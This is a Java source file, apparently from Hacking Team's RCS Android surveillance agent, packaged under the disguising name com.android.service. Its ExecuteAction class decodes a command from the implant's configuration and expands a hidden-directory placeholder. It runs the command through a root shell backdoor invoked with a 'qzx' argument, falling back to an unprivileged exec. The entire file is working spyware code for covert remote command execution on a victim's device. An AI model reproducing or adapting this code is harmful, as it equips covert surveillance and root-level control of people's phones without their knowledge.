/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ExecuteAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.io.IOException;

import android.util.Log;

import com.android.service.auto.Cfg;
import com.android.service.conf.Configuration;
import com.android.service.file.Directory;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ExecuteAction.
 */
public class ExecuteAction extends SubAction {
	private static final String TAG = "ExecuteAction";
	
	private String command;
	
	/**
	 * Instantiates a new execute action.
	 * 
	 * @param actionType
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public ExecuteAction(final int actionType, final byte[] confParams) {
		super(actionType, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		if (this.command.length() == 0)
			return false;
		
		// Proviamo ad eseguire il comando da root
		try {
			Runtime.getRuntime().exec(Configuration.shellFile + " qzx " + this.command);
			return true;
		} catch (final Exception e1) {
			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (root exec)");
			}
		}
		
		// Proviamo ad eseguire il comando da utente normale
		try {
			Runtime.getRuntime().exec(this.command);
			return true;
		} catch (final Exception e1) {
			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (non-root exec)");
			}
		}
		
		return false;
	}

	@Override
	protected boolean parse(final byte[] params) {
		final DataBuffer databuffer = new DataBuffer(params, 0, params.length);

		try {
			final int len = databuffer.readInt();
			final byte[] buffer = new byte[len];
			databuffer.read(buffer);

			String cmd = WChar.getString(buffer, true);
			this.command = Directory.expandHiddenDir(cmd);
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): " + this.command);
			}
		} catch (final IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");
			}
			
			return false;
		}
		
		return true;
	}
}
